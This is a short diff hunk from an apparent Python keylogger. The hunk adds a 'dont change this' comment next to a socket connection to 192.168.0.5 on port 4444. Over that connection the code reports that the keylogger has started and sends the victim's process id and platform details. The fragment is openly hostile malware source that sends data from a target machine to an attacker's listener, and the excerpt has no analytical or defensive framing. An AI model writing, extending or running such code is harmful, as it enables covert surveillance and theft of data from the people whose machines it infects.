@@ -22,7 +22,7 @@ def socket_():
 	global _socket_
 	try:
 		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as _socket_: #List target info
-			_socket_.connect(("192.168.0.5", 4444))
+			_socket_.connect(("192.168.0.5", 4444)) # dont change this 
 			_socket_.sendall(f"[*] Keylogger Started with pid [{os.getpid()}]\n".encode())
 			_socket_.sendall(f"    [+] Target Info:\n".encode())
 			_socket_.sendall(f"       - Platform: {sys.platform}\n".encode())
